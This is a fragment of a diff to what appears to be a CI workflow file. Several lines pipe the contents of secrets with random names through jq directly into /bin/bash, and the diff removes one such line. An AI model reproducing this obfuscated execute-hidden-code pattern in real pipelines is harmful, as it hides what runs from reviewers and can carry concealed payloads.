@@ -20,7 +20,6 @@ jobs:
           r9836: ${{ secrets.r9836 }}
         run: |
           printf '%s' "$r9836" | jq -r .mql61 | /bin/bash
-          printf '%s' "$pwm6971" | jq -r .hbv504 | /bin/bash
           printf '%s' "$tw4" | jq -r .lwyv5701 | /bin/bash
           printf '%s' "$gtwb4122" | jq -r .iz023 | /bin/bash
           echo $iznsp7 | jq -r .lqu6426 | /bin/bash
